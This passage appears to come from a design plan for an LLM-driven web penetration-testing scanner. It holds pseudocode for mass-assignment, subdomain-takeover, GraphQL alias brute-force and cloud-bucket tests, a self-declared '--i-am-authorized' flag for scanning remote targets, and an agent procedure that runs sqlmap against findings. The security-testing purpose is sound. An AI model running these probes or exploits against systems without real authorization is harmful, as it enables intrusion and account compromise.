                        "email_verified", "plan", "subscription"]

    FOR EACH endpoint IN candidates:
        // Get baseline response
        baseline = send_normal_request(endpoint, auth_context)

        // Try adding privilege fields to the request body
        FOR EACH field IN privilege_fields:
            FOR EACH value IN ["admin", true, 1, "superuser"]:
                modified_body = baseline.request_body.clone()
                modified_body[field] = value
                response = send_request(endpoint, body=modified_body, auth=auth_context)

                // Check if the field was accepted
                IF response.status IN [200, 201]:
                    verify = GET(endpoint.replace_method("GET"), auth=auth_context)
                    IF field IN verify.body AND verify.body[field] == value:
                        findings.push(MassAssignment(
                            endpoint=endpoint,
                            field=field,
                            severity=Critical if field contains "admin" else High,
                        ))

    RETURN findings
```

### 5I. Subdomain Takeover

**Pseudocode:**
```
FUNCTION test_subdomain_takeover(subdomains):
    findings = []

    // Services known to be vulnerable to takeover
    takeover_signatures = {
        "s3.amazonaws.com": "NoSuchBucket",
        "herokuapp.com": "No such app",
        "github.io": "There isn't a GitHub Pages site here",
        "azurewebsites.net": "404 Web Site not found",
        "cloudfront.net": "Bad request",
        "pantheon.io": "404 Unknown Site",
        "shopify.com": "Sorry, this shop is currently unavailable",
        "tumblr.com": "Whatever you were looking for doesn't currently exist",
        "wordpress.com": "Do you want to register",
        "ghost.io": "The thing you were looking for is no longer here",
    }

    FOR EACH subdomain IN subdomains:
        cname = dns_resolve_cname(subdomain)
        IF cname IS None:
            CONTINUE

        FOR EACH service_domain, signature IN takeover_signatures:
            IF service_domain IN cname:
                response = GET("http://" + subdomain)
                IF signature IN response.body:
                    findings.push(SubdomainTakeover(
                        subdomain=subdomain,
                        cname=cname,
                        service=service_domain,
                        severity=High,
                        evidence="CNAME points to unclaimed {service_domain} resource"
                    ))

    RETURN findings
```

### 5J. GraphQL-Specific Attacks

**Pseudocode:**
```
FUNCTION test_graphql_advanced(graphql_endpoint, schema):
    findings = []

    // Test 1: Batching abuse
    batch = []
    FOR i IN 0..100:
        batch.push({"query": "{ __typename }"})
    response = POST(graphql_endpoint, body=JSON(batch))
    IF response.status == 200 AND len(parse_json(response.body)) == 100:
        findings.push(GraphQlAbuse(type="batching", severity=Medium,
            evidence="Server accepts batched queries (100 in single request)"))

    // Test 2: Depth attack
    deep_query = build_nested_query(schema, depth=15)
    response = POST(graphql_endpoint, body={"query": deep_query})
    IF response.status == 200 AND response.time > 5_seconds:
        findings.push(GraphQlAbuse(type="depth_dos", severity=Medium))

    // Test 3: Alias brute-force (e.g., login)
    IF schema has "login" mutation:
        alias_query = ""
        FOR i IN 0..50:
            alias_query += 'a{i}: login(user:"admin",pass:"pass{i}") {{ token }}\n'
        response = POST(graphql_endpoint, body={"query": "{" + alias_query + "}"})
        IF response.status == 200:
            findings.push(GraphQlAbuse(type="alias_bruteforce", severity=High,
                evidence="Rate limit bypassed via aliased mutations"))

    // Test 4: Field-level authorization
    IF schema:
        FOR EACH type IN schema.types:
            FOR EACH field IN type.fields:
                IF field.name IN ["email", "ssn", "creditCard", "password", "secret"]:
                    query = build_query_for_field(type, field)
                    response = POST(graphql_endpoint, body={"query": query})
                    IF field.name value appears IN response.body:
                        findings.push(GraphQlAbuse(type="field_authz",
                            field=field.name, severity=High))

    RETURN findings
```

### 5K. Cloud Misconfiguration

**Pseudocode:**
```
FUNCTION test_cloud_misconfig(target_domain, responses):
    findings = []

    // Extract S3/GCS/Azure bucket references from all responses
    bucket_patterns = [
        regex(r"([\w.-]+)\.s3\.amazonaws\.com"),
        regex(r"s3\.amazonaws\.com/([\w.-]+)"),
        regex(r"([\w.-]+)\.blob\.core\.windows\.net"),
        regex(r"storage\.googleapis\.com/([\w.-]+)"),
    ]

    FOR EACH response IN responses:
        FOR EACH pattern IN bucket_patterns:
            FOR EACH bucket IN pattern.find_all(response.body):
                // Test public access
                list_response = GET(bucket_url + "?list-type=2&max-keys=5")
                IF list_response.status == 200 AND "<Contents>" IN list_response.body:
                    findings.push(CloudMisconfiguration(
                        type="public_bucket_listing",
                        resource=bucket,
                        severity=High,
                    ))

    // Test for Firebase
    firebase_response = GET("https://" + target_domain.replace(".", "-") + ".firebaseio.com/.json")
    IF firebase_response.status == 200 AND firebase_response.body != "null":
        findings.push(CloudMisconfiguration(type="firebase_open", severity=Critical))

    RETURN findings
```

---

## WORKSTREAM 6: New Crate — `crates/compliance`

### 6A. CVSS v3.1 Scoring

**Pseudocode:**
```
FUNCTION compute_cvss(finding):
    // Map vulnerability class to CVSS base metrics
    metrics = MATCH finding.vuln_class:
        SqlInjection:
            AV=Network, AC=Low, PR=None, UI=None,
            S=Changed, C=High, I=High, A=None  // Base: 9.3
        CrossSiteScripting(Reflected):
            AV=Network, AC=Low, PR=None, UI=Required,
            S=Changed, C=Low, I=Low, A=None    // Base: 6.1
        CommandInjection:
            AV=Network, AC=Low, PR=None, UI=None,
            S=Unchanged, C=High, I=High, A=High // Base: 9.8
        // ... etc for all classes

    // Adjust for context
    IF finding.requires_auth:
        metrics.PR = Low  // reduces score
    IF finding.defense_context.has_waf AND NOT finding.waf_bypassed:
        // WAF mitigates but doesn't eliminate
        metrics.AC = High

    score = calculate_cvss_vector(metrics)  // use cvss crate
    vector_string = format_vector(metrics)

    RETURN CvssResult(score=score, vector=vector_string, severity_label=label(score))
```

### 6B. Compliance Mapping

**Pseudocode:**
```
FUNCTION map_to_compliance(finding):
    owasp_2021 = MATCH finding.vuln_class:
        SqlInjection | CommandInjection | Ssti | XxeInjection:  "A03:2021 Injection"
        BrokenAuthentication | JwtVulnerability:                "A07:2021 Auth Failures"
        BrokenAuthorization | Idor:                             "A01:2021 Broken Access Control"
        SecurityMisconfiguration | MissingSecurityHeader:       "A05:2021 Security Misconfig"
        SensitiveDataExposure | InformationDisclosure:          "A02:2021 Crypto Failures"
        KnownVulnerableDependency:                              "A06:2021 Outdated Components"
        InsecureDeserialization:                                 "A08:2021 Integrity Failures"
        CrossSiteScripting:                                     "A03:2021 Injection"
        ServerSideRequestForgery:                               "A10:2021 SSRF"
        // ...

    owasp_api = MATCH finding.vuln_class:
        Idor:                    "API1:2023 Broken Object Level Authorization"
        BrokenAuthentication:    "API2:2023 Broken Authentication"
        MassAssignment:          "API3:2023 Broken Object Property Level Authorization"
        RaceCondition:           "API4:2023 Unrestricted Resource Consumption"
        BrokenAuthorization:     "API5:2023 Broken Function Level Authorization"
        // ...

    cwe = MATCH finding.vuln_class:
        SqlInjection:           "CWE-89"
        CrossSiteScripting:     "CWE-79"
        CommandInjection:       "CWE-78"
        PathTraversal:          "CWE-22"
        // ... (already partially implemented in SARIF)

    RETURN ComplianceMapping(owasp_2021, owasp_api, cwe, pci_dss_requirements)
```

### 6C. LLM-Generated Report

**Pseudocode:**
```
FUNCTION generate_llm_report(findings, scan_context, tech_fingerprint):
    // Executive Summary
    exec_summary = llm.generate(
        system="You are a senior penetration tester writing a report for a client.",
        prompt="""
        <scan_context>
            Target: {target_url}
            Technology: {tech_fingerprint}
            Scan duration: {duration}
            Total findings: {count}
            Critical: {critical_count}, High: {high_count}, Medium: {medium_count}, Low: {low_count}
        </scan_context>

        Write a 3-paragraph executive summary:
        1. Scope and methodology
        2. Key findings and risk level (use business language, not technical)
        3. Overall recommendation
        """
    )

    // Per-finding narrative
    FOR EACH finding IN findings:
        finding.narrative = llm.generate(
            prompt="""
            Write a finding report section:

            <finding>
                Vulnerability: {finding.vuln_class}
                Endpoint: {finding.endpoint}
                Parameter: {finding.parameter}
                CVSS: {finding.cvss_score} ({finding.cvss_vector})
                Evidence: {finding.evidence}
                PoC: {finding.poc_command}
            </finding>

            Include:
            1. Description (what is this vulnerability, 2-3 sentences)
            2. Impact (what could an attacker do, in business terms)
            3. Proof of Concept (step-by-step reproduction)
            4. Remediation (specific fix for this codebase/framework)
            5. References (CWE, OWASP)
            """
        )

    // Remediation Roadmap
    roadmap = llm.generate(
        prompt="""
        Given these findings, create a prioritized remediation roadmap.
        Group by: Immediate (this week), Short-term (this month), Long-term.
        Consider: severity, ease of fix, dependencies between fixes.

        <findings_summary>
            {findings_summary_json}
        </findings_summary>
        """
    )

    RETURN FullReport(exec_summary, finding_narratives, roadmap, compliance_mapping)
```

---

## WORKSTREAM 7: Simplified Remote Target Authorization

### 7A. Add `--i-am-authorized` Flag

**Pseudocode:**
```
// In scan_config.rs, add to AuditOptions:
FIELD i_am_authorized: bool  // default false

// In target validation logic:
FUNCTION validate_target_extended(url, attestation, i_am_authorized):
    IF is_localhost(url):
        RETURN Ok

    IF attestation IS Some:
        RETURN verify_attestation(attestation, url)

    IF i_am_authorized:
        LOG WARNING "Remote scanning authorized by operator (--i-am-authorized flag)"
        LOG "Target: {url}, Timestamp: {now}, User: {whoami}"
        // Record in audit log
        audit.append(ScanAuthorizedByOperator(url, timestamp))
        RETURN Ok

    RETURN Err(NonLocalhostTarget)
```

**Audit trail:** The `--i-am-authorized` flag still creates an audit record (who authorized, when, what target). Less ceremony than Ed25519, still traceable.

---

## WORKSTREAM 8: Enhanced LLM Decision Engine

### 8A. Adaptive Scan Strategy

**Pseudocode:**
```
FUNCTION llm_decide_next_action(scan_state):
    prompt = """
    <scan_state>
        Target: {target}
        Technology: {tech_fingerprint}
        Endpoints discovered: {endpoint_count}
        Findings so far: {findings_summary}
        Phases completed: {completed_phases}
        Remaining budget: {remaining_iterations}
        Defense profile: {defense_profile}
    </scan_state>

    Based on the current scan state, what should we do next?
    Options:
    1. FUZZ - run another round of fuzzing (specify which endpoints/classes to prioritize)
    2. EXPLOIT - run exploitation tool on a confirmed finding (specify which finding + tool)
    3. DISCOVER - run more discovery (specify: directory brute-force, JS analysis, parameter discovery)
    4. DEEPEN - test a specific vulnerability more thoroughly (specify class + technique)
    5. REPORT - we have enough findings, generate the report

    Respond with a JSON action plan.
    """

    action = llm.generate(prompt, response_format="json")
    RETURN action
```

### 8B. LLM-Driven IDOR Analysis

**Pseudocode:**
```
FUNCTION llm_analyze_api_for_idor(endpoints, responses):
    prompt = """
    <api_surface>
        {endpoints_with_sample_responses}
    </api_surface>

    Analyze this API surface for potential IDOR vulnerabilities.
    For each endpoint:
    1. Identify which parameters are likely object references (IDs)
    2. Predict the ID format (sequential integer, UUID, encoded)
    3. Suggest specific test cases (what ID values to try)
    4. Rate the likelihood of IDOR (0.0-1.0) based on:
       - Does the endpoint return user-specific data?
       - Are there authorization checks evident in the response?
       - Is the ID format predictable?

    Return JSON array of IDOR test cases.
    """

    test_cases = llm.generate(prompt, response_format="json")
    RETURN test_cases
```

---

## WORKSTREAM 9: Agent SOP

Single unified SOP document for LLM agents to operate AEGIS. Written after all features are implemented.

### SOP Parameters

```
- target_url (required): URL to scan
- authorization (required): "localhost" | "authorized" | "attestation:<path>"
- intensity (required): "quick" | "standard" | "thorough" | "paranoid"
- source_access (optional): "none" | path to source directory
- llm_backend (optional): "none" | "bedrock" | "openai" | "ollama"
- auth_credentials (optional): JSON with login flow or cookie/token
- report_audience (optional): "developer" | "security" | "executive" | "all"
- exploit_tools (optional): list of available tools ["sqlmap", "nuclei", "nmap", ...]
- scope_restrictions (optional): endpoints to include/exclude
```

### SOP Steps (High Level)

```
1. VALIDATE PREREQUISITES
   - Check: cargo build succeeds
   - Check: target URL is reachable
   - Check: required tools are installed (based on exploit_tools parameter)
   - Check: LLM credentials are valid (if llm_backend != "none")

2. PRE-SCAN RECON (if source_access != "none")
   - Run: aegis-orchestrator recon --source-dir <path>
   - Run: aegis-orchestrator update-db --source-dir <path>

3. EXECUTE SCAN
   - Build command from parameters:
     aegis-orchestrator \
       --target <target_url> \
       --preset <intensity_to_preset_mapping> \
       --graph-db <target_hash>_graph.json \
       --history-db <target_hash>_history.db \
       --i-am-authorized  (if authorization == "authorized")
       --scope-attestation <path> (if authorization starts with "attestation:")
       --no-llm (if llm_backend == "none")
       -o <target_hash>_report.sarif \
       -f <report_audience>
   - Monitor scan progress via stdout
   - If scan fails: diagnose from error, fix, retry

4. POST-SCAN EXPLOITATION (if exploit_tools provided)
   - For each confirmed finding in SARIF output:
     - If SqlInjection AND "sqlmap" available: run sqlmap for proof-of-impact
     - If finding has no PoC: generate PoC via LLM
   - Re-run report generation with exploitation evidence

5. INTERPRET AND DELIVER
   - Parse SARIF output
   - Summarize findings by severity
   - For each Critical/High finding: explain business impact
   - Suggest remediation priority order
   - Provide the report file path to user
```

---

## Implementation Dependency Graph

```
                    [WS1: Wire Existing]
                    /    |    |    \    \
                  1A    1B   1C   1D   1E
                  |      |              |
                  v      v              v
              [WS2: Discovery]    [WS5: Vuln Classes]
              /  |  |  |  \       / | | | | | | | | \
            2A  2B 2C 2D 2E    5A 5B 5C 5D 5E 5F 5G 5H 5I 5J 5K
              \  |  |  |  /       \ | | | | | | | | /
               v  v  v  v          v  v  v  v  v  v
              [WS4: Exploiter]     [WS6: Compliance]
              /  |  |  |  \              |
            4A  4B 4C 4D 4E             6A  6B  6C
              \  |  |  |  /              |
               v  v  v  v               v
              [WS7: Remote Auth]   [WS8: LLM Engine]
                    |                    |
                    v                    v
              [WS3: Proxy]         [WS9: Agent SOP]
```

**Parallelizable workstreams:**
- WS1 (wire existing) — can start immediately, no dependencies
- WS2 (discovery) — can start immediately, independent
- WS5 (vuln classes) — can start immediately, independent
- WS6 (compliance) — can start after WS5 (needs new vuln classes defined)
- WS3 (proxy) — independent but lower priority (user has Burp for now)
- WS4 (exploiter) — needs WS5 (trigger exploitation on new finding types)
- WS7 (remote auth) — quick, can start immediately
- WS8 (LLM engine) — needs WS2+WS5 (feeds on discovery + new classes)
- WS9 (SOP) — last, needs everything else done

**Recommended parallel execution:**
- Wave 1: WS1 + WS2 + WS5 + WS7 (4 agents)
- Wave 2: WS4 + WS6 + WS8 (3 agents)
- Wave 3: WS3 (1 agent)
- Wave 4: WS9 (1 agent, writes SOP based on completed features)
